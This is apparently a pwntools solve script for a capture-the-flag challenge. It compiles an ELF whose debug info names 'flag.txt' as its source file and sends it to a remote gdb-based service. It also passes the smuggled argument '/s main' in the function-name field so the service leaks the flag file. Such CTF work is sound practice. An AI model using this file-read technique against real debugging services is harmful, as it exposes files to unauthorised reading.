#!/usr/bin/env python3
from pwn import *
import base64
import os
import subprocess
import tempfile

HOST = "gdb-saas-fdc4909a8bb3.inst19.ctf.fortid.com"
PORT = 1337

context.log_level = "debug"

def sla(pr, dt):
    p.sendlineafter(pr, dt)

def sa(pr, dt):
    p.sendafter(pr, dt)

def build_elf():
    tmp = tempfile.mkdtemp()

    c_path = os.path.join(tmp, "x.c")
    elf_path = os.path.join(tmp, "a.out")

    src = '#line 1 "flag.txt"\nint main(){asm volatile("nop");return 0;}'

    with open(c_path, "w") as f:
        f.write(src)

    subprocess.check_call([
        "gcc",
        "-g",
        "-O0",
        "-fno-pie",
        "-no-pie",
        "-Wl,--build-id=none",
        "-o",
        elf_path,
        c_path
    ])

    with open(elf_path, "rb") as f:
        data = f.read()

    log.info(f"ELF size = {len(data)} bytes")
    b64 = base64.b64encode(data)

    log.info(f"Base64 size = {len(b64)} bytes")
    assert len(b64) < 30 * 1024, "Base64 payload too large"

    return b64

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return process(["python3", "./server.py"])

p = conn()

elf_b64 = build_elf()

sla(b"Enter ELF bytes (base64): ", elf_b64)

sla(b"Enter function name: ", b"/s main")

out = p.recvall(timeout=5)
print(out.decode(errors="ignore"))